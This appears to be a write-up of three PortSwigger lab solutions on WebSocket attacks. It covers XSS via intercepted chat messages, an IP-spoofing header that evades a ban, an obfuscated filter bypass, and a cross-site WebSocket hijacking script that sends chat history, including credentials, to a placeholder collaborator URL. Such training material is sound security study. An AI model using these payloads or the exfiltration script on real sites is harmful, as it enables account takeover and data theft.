# WebSockets

## Manipulating WebSocket messages to exploit vulnerabilities

### Description

[This online shop](https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities) has a live chat feature implemented using WebSockets. Chat messages that you submit are viewed by a support agent in real time. 

### Proof of concept

1. Click "Live chat" and send a chat message. 
2. In Burp Proxy, go to the WebSockets history tab, and observe that the chat message has been sent via a WebSocket message.
3. Using your browser, send a new message containing a `<` character. In Burp Proxy, find the corresponding WebSocket message and observe that the `<` has been HTML-encoded by the client before sending.
4. Ensure that Burp Proxy is configured to intercept WebSocket messages, then send another chat message.
5. Edit the intercepted message to contain the following payload: 

```text
<img src=1 onerror='alert(1)'>
```

6. Observe that an alert is triggered in your browser. This will also happen in the support agent's browser.

### Exploitability

An attacker will need to use a WebSocket message to trigger an `alert()` popup in the support agent's browser. 

----

## Manipulating the WebSocket handshake to exploit vulnerabilities

### Description

[This online shop](https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities) has a live chat feature implemented using WebSockets. It has an aggressive but flawed XSS filter. 

### Proof of concept

1. Click "Live chat" and send a chat message.
2. In Burp Proxy, go to the WebSockets history tab, and observe that the chat message has been sent via a WebSocket message.
3. Right-click on the message and select "Send to Repeater".
4. Edit and resend the message containing a basic XSS payload, such as:

```text
<img src=1 onerror='alert(1)'>
```

5. Observe that the attack has been blocked, and that your WebSocket connection has been terminated. 
6. Click "Reconnect", and observe that the connection attempt fails because your IP address has been banned.
7. Add the following header to the handshake request to spoof your IP address:

```text
X-Forwarded-For: 1.1.1.1
```

8. Click "Connect" to successfully reconnect the WebSocket. 
9. Send a WebSocket message containing an obfuscated XSS payload, such as:

```text
<img src=1 oNeRrOr=alert`1`> 
```

### Exploitability

An attacker will need to use a WebSocket message to trigger an `alert()` popup in the support agent's browser. 

----

## Cross-site WebSocket hijacking

### Description

[This online shop](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab) has a live chat feature implemented using WebSockets. 

### Proof of concept

1. Click "Live chat" and send a chat message.
2. Reload the page.
3. In Burp Proxy, in the WebSockets history tab, observe that the "READY" command retrieves past chat messages from the server.
4. In Burp Proxy, in the HTTP history tab, find the WebSocket handshake request. Observe that the request has no CSRF tokens.
5. Right-click on the handshake request and select "Copy URL".
6. In your browser, go to the exploit server and paste the following template into the "Body" section:

```text
<script>
  var ws = new WebSocket('wss://websocket-url');
  ws.onopen = function() {
    ws.send("READY");
  };
  ws.onmessage = function(event) {
    fetch('https://collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
  };
</script>
```

7. Replace ``websocket-url`` with the URL from the WebSocket handshake (``lab-id.web-security-academy.net/chat``). Make sure you change the protocol from ``https://`` to ``wss://``. Replace ``collaborator-url`` with a payload generated by Burp Collaborator Client.
8. Click "View exploit".
9. Poll for interactions using Burp Collaborator client. Verify that the attack has successfully retrieved your chat history and exfiltrated it via Burp Collaborator. For every message in the chat, Burp Collaborator has received an HTTP request. The request body contains the full contents of the chat message in JSON format. Note that these messages may not be received in the correct order.
10. Go back to the exploit server and deliver the exploit to the victim.
11. Poll for interactions using Burp Collaborator client again. Observe that you've received more HTTP interactions containing the victim's chat history. Examine the messages and notice that one of them contains the victim's username and password.
12. Use the exfiltrated credentials to log in to the victim user's account.

### Exploitability

An attacker will need to use the exploit server to host an HTML/JavaScript payload that uses a cross-site WebSocket hijacking attack to exfiltrate the victim's chat history, then use this to gain access to their account. 


